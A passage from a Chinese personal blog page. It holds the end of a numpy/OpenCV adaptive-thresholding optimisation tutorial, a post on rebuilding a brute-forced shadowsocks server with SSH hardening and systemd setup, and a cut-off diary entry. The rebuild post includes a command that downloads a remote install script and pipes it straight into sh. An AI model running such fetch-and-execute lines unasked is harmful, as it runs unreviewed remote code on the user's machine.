    <span class="n">kernel</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">ones</span><span class="p">((</span><span class="n">boxsize</span><span class="p">,</span> <span class="n">boxsize</span><span class="p">))</span> <span class="o">*</span> <span class="p">(</span><span class="mi">100</span><span class="o">-</span><span class="n">threshold</span><span class="p">)</span><span class="o">/</span><span class="mi">100</span> <span class="o">/</span> <span class="p">(</span><span class="n">boxsize</span><span class="o">*</span><span class="n">boxsize</span><span class="p">)</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">cv</span><span class="o">.</span><span class="n">filter2D</span><span class="p">(</span><span class="n">mat</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">kernel</span><span class="p">)</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="n">mat</span> <span class="o">&lt;</span> <span class="n">result</span><span class="p">,</span> <span class="p">[</span><span class="n">set_value</span><span class="p">],</span> <span class="p">[</span><span class="n">inv_value</span><span class="p">])</span>
    <span class="k">return</span> <span class="n">ret</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">uint8</span><span class="p">)</span>
</pre></div>

<p>这是时间：</p>
<div class="highlight"><pre><span></span>⇒  python3 implement.py
Image shape 640x480
opencv_way take 35.920926 ms
</pre></div>

<p>好了， 可以全剧终了。<br>
简单的6行代码， 纯粹的暴力美学。 速度快了40倍。（你学到了么？）<br>
这里我们借助opencv 的 <code>filter2D</code>方法， 自己定义了一个kernel， 用来求一个点周围区域的平均值， 接下来的计算就全部交给opencv了。 <br>
关于opencv， 有一点需要补充， <strong>opencv表示， numpy是辣鸡， 请多使用opencv自带的函数</strong>。  </p>
<h2>向量化</h2>
<p>还不能全剧终， 接下来是重点， numpy是为矩阵计算而生的， 我们前面一直按照C的思维来对单个点做操作， 而且for循环的存在导致速度下降太多， 接下来我们要寻求把for循环替换掉， 改成向量的计算。</p>
<p>对于numpy来说， 比如我有两个2维矩阵A和B， 要计算两个矩阵上所有点的差， 从速度上来说， </p>
<div class="highlight"><pre><span></span>A - B &gt; A[i] - B[i] &gt; A[i,j] - B[i,j]
</pre></div>

<p>我们现在希望把所有的for循环， 替换为矩阵的计算 <code>A - B</code></p>
<p>一开始的时候我想到利用一次for循环， 从上往下计算两行之间的值， 接着从左往右计算每一列的值， 但是这样只能去掉一个for循环， 后来我想了2个晚上， 想通了实际上所有等距离点操作都可以转化为等距离的向量操作， 进而可以通过构造矩阵来进行矩阵间的操作。  </p>
<p>对于之前的代码， 计算累积和部分已经很好了， 关键之后的计算， 代码冗余， 效率低下。  </p>
<p>其中造成整个for循环存在的关键因素是下面这句代码</p>
<p><div class="highlight"><pre><span></span>integral_map[x2, y2] - integral_map[x1, y2] - integral_map[x2, y1] + integral_map[x1, y1]
</pre></div>
而实际上， 这些点之间是等距离的， （boxsize的距离）， 也就是说， 每一个点对应的x1， x2, y1, y2 都是固定的， 我们可以构造出4个矩阵， 分别向左上， 右上， 左下， 右下位移一段距离， 
这样就可以吧整个for循环计算化简成  </p>
<div class="highlight"><pre><span></span>D + A - C - B
</pre></div>

<p>那么怎么构造出这些矩阵呢？<br>
想象一下， 把<code>integral_map[x1, y1]</code>当成一个集合， 记为A， <code>integral_map[x1, y2]</code>的集合记为B， <code>integral_map[x2, y1]</code>的集合记为C，<code>integral_map[x2, y2]</code>记为D。   </p>
<p>以构造A为例， A实际上是对原先的矩阵向上和向左平移了一半的boxsize的距离， 比如对于矩阵右下角的点，A对应于 <code>integral_map[h-half_boxsize, w-half_boxsize]</code>  </p>
<p>但是对于左上角的点， 超出了累积矩阵的范围， 为了避免额外的对边界的判断， 我们要额外构造出边框。  </p>
<p>想象一下， 比如我们有一个5x5的矩阵， boxsize取3, </p>
<p><div class="highlight"><pre><span></span>  0 1 2 3 4
0 * * * * *
1 * * * * *
2 * * * * *
3 * * * * *
4 * * * * *
</pre></div>
计算 (2, 2) 的时候， 取 (1, 1), (1, 3)， （3，1）， （3，3）四个点<br>
计算(0,0)上的和的时候， 右下角取（1，1）， 左上角超出了边界，所以只能取（0，0）<br>
计算（0，1）的时候，右下角是（1，2） 但是左上角还是（0，0）    </p>
<p>所以我们可以构造出一个<code>(boxsize-1)/2</code> 长度的边框，边框上的值和边界的值一样。 这样我们可以通过平移得到ABCD四个矩阵， 而不用额外的边界判断。 </p>
<p><div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">vector_method</span><span class="p">(</span><span class="n">mat</span><span class="p">,</span> <span class="n">w</span><span class="p">,</span> <span class="n">h</span><span class="p">,</span> <span class="n">set_value</span><span class="p">,</span> <span class="n">threshold</span><span class="p">,</span> <span class="n">boxsize</span><span class="p">):</span>
    <span class="n">inv_value</span> <span class="o">=</span> <span class="n">set_value</span> <span class="o">^</span> <span class="mi">255</span>
    <span class="n">integral_map</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros_like</span><span class="p">(</span><span class="n">mat</span><span class="p">,</span> <span class="n">dtype</span><span class="o">=</span><span class="nb">int</span><span class="p">)</span>

    <span class="n">np</span><span class="o">.</span><span class="n">cumsum</span><span class="p">(</span><span class="n">mat</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span> <span class="n">out</span><span class="o">=</span><span class="n">integral_map</span><span class="p">)</span>
    <span class="n">np</span><span class="o">.</span><span class="n">cumsum</span><span class="p">(</span><span class="n">integral_map</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">out</span><span class="o">=</span><span class="n">integral_map</span><span class="p">)</span>

    <span class="n">half_s</span> <span class="o">=</span> <span class="n">boxsize</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
    <span class="n">big_mat</span> <span class="o">=</span> <span class="n">cv</span><span class="o">.</span><span class="n">copyMakeBorder</span><span class="p">(</span><span class="n">integral_map</span><span class="p">,</span> <span class="n">half_s</span><span class="p">,</span> <span class="n">half_s</span><span class="p">,</span> <span class="n">half_s</span><span class="p">,</span> <span class="n">half_s</span><span class="p">,</span> <span class="n">borderType</span><span class="o">=</span><span class="n">cv</span><span class="o">.</span><span class="n">BORDER_REPLICATE</span><span class="p">)</span>
    <span class="n">big_h</span><span class="p">,</span> <span class="n">big_w</span> <span class="o">=</span> <span class="n">big_mat</span><span class="o">.</span><span class="n">shape</span>
    <span class="c1"># 构造4个矩阵</span>
    <span class="c1"># top left</span>
    <span class="n">A</span> <span class="o">=</span> <span class="n">big_mat</span><span class="p">[:</span><span class="n">h</span><span class="p">,</span> <span class="p">:</span><span class="n">w</span><span class="p">]</span>
    <span class="c1"># bottom left</span>
    <span class="n">B</span> <span class="o">=</span> <span class="n">big_mat</span><span class="p">[</span><span class="n">big_h</span> <span class="o">-</span> <span class="n">h</span><span class="p">:,</span> <span class="p">:</span><span class="n">w</span><span class="p">]</span>
    <span class="c1"># top right</span>
    <span class="n">C</span> <span class="o">=</span> <span class="n">big_mat</span><span class="p">[:</span><span class="n">h</span><span class="p">,</span> <span class="n">big_w</span> <span class="o">-</span> <span class="n">w</span><span class="p">:]</span>
    <span class="c1"># bottom right</span>
    <span class="n">D</span> <span class="o">=</span> <span class="n">big_mat</span><span class="p">[</span><span class="n">big_h</span> <span class="o">-</span> <span class="n">h</span><span class="p">:,</span> <span class="n">big_w</span> <span class="o">-</span> <span class="n">w</span><span class="p">:]</span>

    <span class="n">COUNT</span> <span class="o">=</span> <span class="n">get_count_matrix</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="n">h</span><span class="p">,</span> <span class="n">boxsize</span><span class="p">)</span>
    <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">D</span> <span class="o">+</span> <span class="n">A</span> <span class="o">-</span> <span class="n">B</span> <span class="o">-</span> <span class="n">C</span><span class="p">)</span><span class="o">*</span><span class="p">((</span><span class="mi">100</span><span class="o">-</span><span class="n">threshold</span><span class="p">)</span><span class="o">/</span><span class="mi">100</span><span class="p">)</span> <span class="o">/</span> <span class="n">COUNT</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="n">mat</span> <span class="o">&lt;</span> <span class="n">result</span><span class="p">,</span> <span class="p">[</span><span class="n">set_value</span><span class="p">],</span> <span class="p">[</span><span class="n">inv_value</span><span class="p">])</span>
    <span class="k">return</span> <span class="n">ret</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">uint8</span><span class="p">)</span>
</pre></div>
但是， 现在还有一道阴影笼罩着我们， 我们没有办法得到窗口的实际大小。 边界附近的点上的窗口是变化的， 我们得额外构造出一个矩阵<code>COUNT</code>来表示每个点上的窗口大小。  </p>
<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">get_count_matrix</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="n">h</span><span class="p">,</span> <span class="n">boxsize</span><span class="p">):</span>
    <span class="sd">&quot;&quot;&quot;</span>
<span class="sd">    矩阵上每个点的值表示该点上的窗口覆盖的总点数。</span>
<span class="sd">    &quot;&quot;&quot;</span>

    <span class="c1"># faster than (boxsize-1) // 2</span>
    <span class="n">half_boxsize</span> <span class="o">=</span> <span class="p">(</span><span class="n">boxsize</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>

    <span class="c1"># 窗口的真正大小并不是boxsize！而是（boxsize - 1）！</span>
    <span class="n">A</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">ones</span><span class="p">((</span><span class="n">h</span><span class="p">,</span> <span class="n">w</span><span class="p">))</span> <span class="o">*</span> <span class="p">(</span><span class="n">boxsize</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">B</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">ones</span><span class="p">((</span><span class="n">h</span><span class="p">,</span> <span class="n">w</span><span class="p">))</span> <span class="o">*</span> <span class="p">(</span><span class="n">boxsize</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">half_boxsize</span><span class="p">):</span>
        <span class="n">value</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="n">half_boxsize</span>
        <span class="n">A</span><span class="p">[</span><span class="n">i</span><span class="p">,</span> <span class="p">:]</span> <span class="o">=</span> <span class="n">value</span>
        <span class="n">A</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="n">i</span><span class="p">,</span> <span class="p">:]</span> <span class="o">=</span> <span class="n">value</span>
        <span class="n">B</span><span class="p">[:,</span> <span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">value</span>
        <span class="n">B</span><span class="p">[:,</span> <span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">value</span>

    <span class="k">return</span> <span class="n">A</span> <span class="o">*</span> <span class="n">B</span>
</pre></div>

<p>看一下所需的时间</p>
<div class="highlight"><pre><span></span>⇒  python3 implement.py
Image shape 640x480
vector_method take 22.166661 ms
</pre></div>

<p>现在我们比最初快了80倍， 已经接近论文上的理论速度了， 但是<code>get_count_matrix</code>函数显得非常的力不从心， 还可以寻找优化的办法。  </p>
<h2>优化后的向量化方法</h2>
<p>回想之前的整个过程， 我们对边界的处理实际上过于保守了， 导致计算窗口覆盖点数的时候过于小心翼翼了(不然boxsize-1是怎么得出来的， 都是泪啊)。</p>
<p>我们可以在计算累积和之前先对边界翻折来进行填充， 之后再对扩展后的矩阵进行累积和，这样可以省略掉<code>get_count_matrix</code>函数， 统一采用<code>(boxsize-1)*(boxsize-1)</code>。  </p>
<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">optimized_vector_method</span><span class="p">(</span><span class="n">mat</span><span class="p">,</span> <span class="n">w</span><span class="p">,</span> <span class="n">h</span><span class="p">,</span> <span class="n">set_value</span><span class="p">,</span> <span class="n">threshold</span><span class="p">,</span> <span class="n">boxsize</span><span class="p">):</span>
    <span class="n">inv_value</span> <span class="o">=</span> <span class="n">set_value</span> <span class="o">^</span> <span class="mi">255</span>
    <span class="n">half_s</span> <span class="o">=</span> <span class="n">boxsize</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
    <span class="n">integral_map</span> <span class="o">=</span> <span class="n">cv</span><span class="o">.</span><span class="n">copyMakeBorder</span><span class="p">(</span><span class="n">mat</span><span class="p">,</span> <span class="n">half_s</span><span class="p">,</span> <span class="n">half_s</span><span class="p">,</span> <span class="n">half_s</span><span class="p">,</span> <span class="n">half_s</span><span class="p">,</span> <span class="n">borderType</span><span class="o">=</span><span class="n">cv</span><span class="o">.</span><span class="n">BORDER_REFLECT101</span><span class="p">)</span>
    <span class="n">integral_map</span> <span class="o">=</span> <span class="n">integral_map</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">uint32</span><span class="p">)</span>

    <span class="n">integral_map</span><span class="o">.</span><span class="n">cumsum</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">out</span><span class="o">=</span><span class="n">integral_map</span><span class="p">)</span>
    <span class="n">integral_map</span><span class="o">.</span><span class="n">cumsum</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">out</span><span class="o">=</span><span class="n">integral_map</span><span class="p">)</span>

    <span class="n">big_h</span><span class="p">,</span> <span class="n">big_w</span> <span class="o">=</span> <span class="n">integral_map</span><span class="o">.</span><span class="n">shape</span>
    <span class="c1"># 构造4个矩阵</span>
    <span class="c1"># top left</span>
    <span class="n">A</span> <span class="o">=</span> <span class="n">integral_map</span><span class="p">[:</span><span class="n">h</span><span class="p">,</span> <span class="p">:</span><span class="n">w</span><span class="p">]</span>
    <span class="c1"># bottom left</span>
    <span class="n">B</span> <span class="o">=</span> <span class="n">integral_map</span><span class="p">[</span><span class="n">big_h</span> <span class="o">-</span> <span class="n">h</span><span class="p">:,</span> <span class="p">:</span><span class="n">w</span><span class="p">]</span>
    <span class="c1"># top right</span>
    <span class="n">C</span> <span class="o">=</span> <span class="n">integral_map</span><span class="p">[:</span><span class="n">h</span><span class="p">,</span> <span class="n">big_w</span> <span class="o">-</span> <span class="n">w</span><span class="p">:]</span>
    <span class="c1"># bottom right</span>
    <span class="n">D</span> <span class="o">=</span> <span class="n">integral_map</span><span class="p">[</span><span class="n">big_h</span> <span class="o">-</span> <span class="n">h</span><span class="p">:,</span> <span class="n">big_w</span> <span class="o">-</span> <span class="n">w</span><span class="p">:]</span>

    <span class="c1"># COUNT = get_count_matrix(w, h, boxsize)</span>
    <span class="n">COUNT</span> <span class="o">=</span> <span class="p">(</span><span class="n">boxsize</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">**</span><span class="mi">2</span>
    <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">D</span> <span class="o">+</span> <span class="n">A</span> <span class="o">-</span> <span class="n">B</span> <span class="o">-</span> <span class="n">C</span><span class="p">)</span> <span class="o">*</span> <span class="p">((</span><span class="mi">100</span><span class="o">-</span><span class="n">threshold</span><span class="p">)</span> <span class="o">/</span> <span class="mi">100</span><span class="p">)</span> <span class="o">/</span> <span class="n">COUNT</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="n">mat</span> <span class="o">&lt;</span> <span class="n">result</span><span class="p">,</span> <span class="p">[</span><span class="n">set_value</span><span class="p">],</span> <span class="p">[</span><span class="n">inv_value</span><span class="p">])</span>
    <span class="k">return</span> <span class="n">ret</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">uint8</span><span class="p">)</span>
</pre></div>

<p>看看计算时间，  </p>
<div class="highlight"><pre><span></span>⇒  python3 implement.py
Image shape 640x480
optimized_vector_method take 10.539570999999999 ms
</pre></div>

<p>比最初快了150倍， 而且超过了论文上的C语言实现的15ms的时间。  </p>
<h2>总结分析</h2>
<p>对于最后的这个方法， 需要额外解释一下为什么会比论文快。<br>
其中一个是CPU的原因， 论文上用的是4核奔腾3.4Ghz的CPU，而我自己的是i5 2.7GHz。<br>
i5应该是快一些的， （我猜）</p>
<p>之后是在对窗口大小的计算时间上， 因为我们通过填充扩展矩阵， 使得每一个点的窗口大小都是固定的值， 比论文中的方法省去了多余的窗口大小计算和多余的边界判断。<br>
但是扩展矩阵在计算累积和的时候有额外的时间消耗， boxsize默认采用边长的1/8， 
构造后的矩阵比原先大了 81/64 倍的大小。<br>
不过在之后的计算中并没有额外的消耗。  </p>
<p>再次， 虽然我们构造出了4个矩阵ABCD， 但是实际上没有对内存做拷贝， ABCD都是累积和矩阵上的映射， 没有对内存中的实际数据做拷贝。</p>
<p>最后，   </p>
<p><div class="highlight"><pre><span></span>integral_map = integral_map.astype(np.uint32)
</pre></div>
我指定了矩阵中的元素的大小， 统一为无符号32位， 速度又得到了一定的提升。<br>
但是uint32有其局限， 只能存下2^32次方的数据， 灰度图的每一个点的最大取值是2^8， 于是uint32的累积矩阵只能存下2^24个像素点， 然而由于填充了边框， 矩阵比实际大了81/64， 约1.266倍， <code>sqrt(2^24/1.266) = 3640</code>,  所以只能处理3640x3640的图片， 但是从平均情况来说， 每一个点平均取2^7， 于是我们可以处理最大5148x5148的图片。</p>
<p>到此， 完成了从最初的1600ms到10ms的优化。  </p>
<h2>彩蛋</h2>
<p>混沌邪恶  </p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">cv2</span> <span class="kn">as</span> <span class="nn">cv</span>

<span class="k">def</span> <span class="nf">wtf</span><span class="p">(</span><span class="n">mat</span><span class="p">,</span> <span class="n">w</span><span class="p">,</span> <span class="n">h</span> <span class="p">,</span> <span class="n">set_value</span><span class="p">,</span> <span class="n">threshold</span><span class="p">,</span> <span class="n">boxsize</span><span class="p">):</span>
    <span class="c1"># 这才叫Python嘛！</span>
    <span class="k">return</span> <span class="n">cv</span><span class="o">.</span><span class="n">adaptiveThreshold</span><span class="p">(</span><span class="n">mat</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="n">cv</span><span class="o">.</span><span class="n">ADAPTIVE_THRESH_GAUSSIAN_C</span><span class="p">,</span> <span class="n">cv</span><span class="o">.</span><span class="n">THRESH_BINARY_INV</span><span class="p">,</span> <span class="n">boxsize</span><span class="p">,</span> <span class="mi">20</span><span class="p">)</span>
</pre></div>

<p>咕咕咕？？？<br>
我选择opencv自带的局部自适应高斯二值化</p>
<div class="highlight"><pre><span></span>⇒  python3 implent.py
Image shape 640x480
wtf take 8.884578000000001 ms
</pre></div>
  </div>
  <hr />
</article>
<article>
  <header>
    <h2><a href="http://littlezz.github.io/ji-yi-ci-fu-wu-qi-bei-bao-po-hou-zai-hou-zhong-jian-ssde-jing-li.html#ji-yi-ci-fu-wu-qi-bei-bao-po-hou-zai-hou-zhong-jian-ssde-jing-li">记一次服务器被爆破后灾后重建ss的经历</a></h2>
    <p>
      Posted on Fri 18 November 2016 in <a href="http://littlezz.github.io/category/code.html">Code</a>
      &#8226; <a href="http://littlezz.github.io/ji-yi-ci-fu-wu-qi-bei-bao-po-hou-zai-hou-zhong-jian-ssde-jing-li.html#disqus_thread">Leave a comment</a>
    </p>
  </header>
  <div>
      <h2>疑似被黑</h2>
<p>2年前和基友合力租了一台服务器用于搭建ss服务， 当年啥也不懂， 系统选的是fedora， yum install fail2ban之后主要精力就是折腾ss， 配了supervisord， 编译了hybla的模块， 就不管了。  </p>
<p>2年来一直没出什么大事， 偶尔大面积100%丢包过一下就好了， 没当回事。  </p>
<p>直到昨天因为系统更新准备重新编译hybla， 登录上去顺便用网上抄了的命令查看了一下当前连接量， </p>
<div class="highlight"><pre><span></span>netstat -an | grep 443 | grep ESTABLISHED | wc -l
</pre></div>

<p>大的惊人， 开始慌了。  </p>
<p>检查log日志， 发现大量</p>
<div class="highlight"><pre><span></span>2016-11-16 01:16:01 ERROR can not parse header when handling connection from ::ffff:&lt;ip&gt;:&lt;port&gt;
</pre></div>

<p>反查这些ip， 发现都不是我们自己的ip。<br>
我估计是被爆破了， 但是我端口用的是443， 所以也不太好确定是不是真的被爆破。
之后就是ban ip， 换端口， 改密码。  </p>
<p>接着开始考虑服务器本身有没有被攻破， 看了一下ssh的22端口， 发现有其他的ip在建立连接， 到这里我都没有特别慌张， 我想， 我还有fail2ban呢。  </p>
<p>检查了一下我的fail2ban， 发现处于开启失败状态。<br>
顺带， ssh服务没换端口， 允许root账号登录， 允许密码登录。</p>
<p>『卧槽， 精彩了』  </p>
<p>赶紧联系大腿。</p>
<p>先打<code>w</code>命令， 一片空白， 一般登录了的话至少有自己一个人， 现在什么也没有， 六神表示<code>w</code>估计被改了， 可能是被rootkit了， rootkit了的话基本就很难看出其他的东西了。  </p>
<p>往后是一些挣扎， 检查<code>ps -aux</code>， 看不出来。
检查<code>who -a /var/log/wtmp</code>, 看一下登录的信息， 看不出来。<br>
检查bash_history, zsh_history， 根本懒得看了。  </p>
<p>淦他娘啊， 我选择重装！  </p>
<h2>灾后重建</h2>
<p>这次选了ubuntu， 而且有经验了。  </p>
<ul>
<li>
<p>先装<code>zsh</code>, <code>apt-get install zsh</code>  </p>
</li>
<li>
<p>建立用户, 指定shell为zsh， <code>useradd youruser -m -s /bin/zsh</code></p>
</li>
<li>
<p>上传公钥， 通过 <code>ssh-copy-id</code> 命令。  </p>
</li>
<li>
<p>更改ssh的配置， 改端口， 关root登录， 关密码登录。  </p>
<p><div class="highlight"><pre><span></span>PermitRootLogin no
Port 12345
PasswordAuthentication no
</pre></div>
* 重启ssh服务。  </p>
</li>
<li>
<p>安装 <code>denyhosts</code>, <code>apt-get install denyhosts</code>  </p>
</li>
<li>
<p><code>oh-my-zsh</code></p>
<div class="highlight"><pre><span></span>apt-get install git
sh -c <span class="s2">&quot;</span><span class="k">$(</span>wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -<span class="k">)</span><span class="s2">&quot;</span>
</pre></div>

</li>
</ul>
<h2>配置ss</h2>
<h4>更新系统， 装<code>pip</code>， <code>shadowsocks</code></h4>
<div class="highlight"><pre><span></span>apt-get install python-pip
pip install -U pip
pip install shadowsocks
</pre></div>

<h4>安装密码库， 安装<code>libsodium</code>依赖</h4>
<div class="highlight"><pre><span></span>apt-get install python-m2crypto
apt-get install libsodium18
pip install M2Crypto
</pre></div>

<h4>配置<code>/etc/shadowsocks.json</code></h4>
<div class="highlight"><pre><span></span><span class="p">{</span>
    <span class="nt">&quot;server&quot;</span><span class="p">:</span><span class="s2">&quot;::&quot;</span><span class="p">,</span>
    <span class="nt">&quot;server_port&quot;</span><span class="p">:</span><span class="mi">8899</span><span class="p">,</span>
    <span class="nt">&quot;local_address&quot;</span><span class="p">:</span> <span class="s2">&quot;127.0.0.1&quot;</span><span class="p">,</span>
    <span class="nt">&quot;local_port&quot;</span><span class="p">:</span><span class="mi">1080</span><span class="p">,</span>
    <span class="nt">&quot;password&quot;</span><span class="p">:</span><span class="s2">&quot;password&quot;</span><span class="p">,</span>
    <span class="nt">&quot;timeout&quot;</span><span class="p">:</span><span class="mi">100</span><span class="p">,</span>
    <span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="s2">&quot;&lt;choose a method&gt;&quot;</span><span class="p">,</span>
    <span class="nt">&quot;fast_open&quot;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
    <span class="nt">&quot;workers&quot;</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span>
    <span class="nt">&quot;user&quot;</span><span class="p">:</span><span class="s2">&quot;nobody&quot;</span>
<span class="p">}</span>
</pre></div>

<p>服务器参数设置<code>"::"</code>可以同时监听ipv4和ipv6, user设置nobody权限， 选一个加密方式， 另外最新是可以打开OTA来防止被攻击， 但是需要客户端也支持OTA。 </p>
<p>除此以外， 还可以用提供的 <a href="https://github.com/shadowsocks/shadowsocks/blob/master/utils/autoban.py">autoban.py</a> 来ban ip,使用方法参考<a href="https://github.com/shadowsocks/shadowsocks/wiki/Ban-Brute-Force-Crackers">Ban Brute Force Crackers</a> .<br>
注意到同时监听ipv4和ipv6的时候， 这个代码提取ip的方式有问题，要改一下，<br>
第41行改成  </p>
<div class="highlight"><pre><span></span>ip = line.split()[-1].split(&#39;:&#39;)[-2]
</pre></div>

<p><strong>（小心不要把自己ban了</strong></p>
<p><br>  </p>
<h4>关于优化</h4>
<p>参考  <a href="https://github.com/iMeiji/shadowsocks_install/wiki/shadowsocks-optimize">shadowsocks-optimize</a>, 不重复了  </p>
<h4>配置开机自启动</h4>
<p>rc.local ubuntu用不了， 需要自己写一个<code>shadowsocks.service</code>:<br>
在<code>/etc/systemd/system</code>下建立一个文件， 比如<code>shadowsocks.service</code>， 写入如下内容  </p>
<div class="highlight"><pre><span></span><span class="k">[Unit]</span>
<span class="na">Description</span><span class="o">=</span><span class="s">run ssserver on background</span>

<span class="k">[Service]</span>
<span class="na">Type</span><span class="o">=</span><span class="s">forking</span>
<span class="na">ExecStart</span><span class="o">=</span><span class="s">/usr/local/bin/ssserver -c /etc/shadowsocks.json -d restart</span>
<span class="na">ExecStop</span><span class="o">=</span><span class="s">/usr/local/bin/ssserver -c /etc/shadowsocks.json -d stop</span>

<span class="k">[Install]</span>
<span class="na">WantedBy</span><span class="o">=</span><span class="s">multi-user.target</span>
</pre></div>

<p>参考： <br>
<a href="https://unix.stackexchange.com/questions/47695/how-to-write-startup-script-for-systemd">how-to-write-startup-script-for-systemd</a></p>
<p><a href="https://www.freedesktop.org/software/systemd/man/systemd.service.html">systemd.service.html</a></p>
<p>按说明， <code>Type</code>选<code>forking</code>而不是<code>simple</code>。</p>
<p>之后可以用<code>systemctl start shadowsocks</code> 和<code>systemctl stop shadowsocks</code> 开关ss.  </p>
<p>使用 <code>systemctl enable shadowsocks</code> 让ss开机启动。</p>
<h2>总结</h2>
<p><del>在被日中成长</del>。  </p>
  </div>
  <hr />
</article>
<article>
  <header>
    <h2><a href="http://littlezz.github.io/lan.html#lan">懒</a></h2>
    <p>
      Posted on Wed 17 August 2016 in <a href="http://littlezz.github.io/category/diary.html">diary</a>
      &#8226; Tagged with
      <a href="http://littlezz.github.io/tag/ri-ji.html">日记</a>,      <a href="http://littlezz.github.io/tag/xia-che.html">瞎扯</a>,      <a href="http://littlezz.github.io/tag/xiao-jie.html">小结</a>      &#8226; <a href="http://littlezz.github.io/lan.html#disqus_thread">Leave a comment</a>
    </p>
  </header>
  <div>
      <p><img alt="" src="../images/need_fix.jpg">  </p>
<p>最近太懒了， 之前写的几个练手的项目， 有一些没有放到github上面就已经弃坑了， 至于一些开的坑， 也处于长期不填的状态。  </p>
<p>最近在准备写一个即时聊天的网站来练手，前端用reactjs， 后端是aiohttp， 数据库mongodb，  主要是想体验一把分布式的Websocket 和Python3.5 的<code>await/async</code>语法的。但是按现在的进度看来要花大把的时间在前端上面了， 我一年前不知道为什么两个元素会上下排列， 一年后还是不知道为什么。  </p>
<p>前端， 总是给我一种五五开的『这他妈是什么， 这他妈又是什么』的感觉。</p>
<p>不久前写过一个chrome的插件<a href="https://github.com/littlezz/PixivFast">PixivFast</a>， 用来让我在p站刷图时可以不用点开大图之后再右键另存为， 而是按一下<code>s</code>就可以弹出下载大图的会话框。 实用， 但是没放到google商店上， 而且我还想着再加一个同时给10分评分的功能， 于是就一直拖着。目前有一名忠实的用户——我自己， 不过由于没有在google商店上面发布， 每次重启浏览器都得重新安装插件， 就现状看来， 这个『忠实』的用户也快叛变了。  </p>
<p>还有一个备份A岛讨论串的爬虫， <a href="https://github.com/littlezz/island-backup">island-backup</a>, 用aiohttp写的。当初野心勃勃， 如今也只是剩下几个自己开的issue没关， kukuku岛禁用api接口之后我懒得再管, 于是现在只能用于主岛。甚至github上面代码到了v1.1.2， 但是pypi上面还是停留在v1.0.1。<br>
懒到不想打包。  </p>
<p>其实api接口禁用之后解析html就好了， 懒。 我之前写过一个搜索出A岛回复数超过一定量的串的程序， 当时是有精力啊， 支持A岛， 哭哭哭岛， 备胎岛， 甚至是K岛， 里面有socks的代理设置， 而且还图形化了，用的是自带的tk。 然后呢？mac上面的tk有问题， 触摸板双指滑动tk就崩， 我自己的mac上面下载了新的tk， 没有问题，  后来兴致勃勃的跑去给蛋蛋试用， 他从github上克隆好程序装好所需的依赖， 启动之后双指一上滑， Duang！ </p>
<p>我和他解释啊， 这不是我的锅啊， 这是tk的锅啊， tk的锅啊， 底层的锅啊， 我救不了啊。 </p>
<p>你要不装个新的tk试试？ </p>
<p>他给了我一个关爱智障的眼神。  </p>
<p><img alt="" src="../images/2.jpg">  </p>
<p>这个项目后来也不了了之了， 我自己都不用。  </p>
<p>后来还写了一个<a href="https://github.com/littlezz/ESL-Model">ESL-Model</a>, 这东西我都不想说， 现在都快成黑历史了， 我原先计划把那本 The Elements of statistical Learning 上面的方法全部实现一遍的， 后来大概止步于卷积神经网络的那个patch和步长不能刚好走完一层， 比如书上说patch 3x3, 每次走两格， 但是那一层是16x16， 不能刚好走完啊。我看那个cs231也是刚好能够走完一层的， 于是我就懵逼了啊。<br>
彼时日常生活也发生了些事情， 我没有精力再搞， 于是放了两个月， 到得现在大概是放弃了。 彻底是一个坑了。</p>
<p>唉都是借口， 都是懒。  </p>
<p>我还是计划一下之后怎么办吧，虽然都是练手， 没什么时间的要求， 但是老拖下去也不是办法。  </p>
<p>至少：  </p>
<ul>
<li>pixivfast 给弄完交钱注册个账号放到google商店上。  </li>
<li>island_backup 把issue清了。  </li>
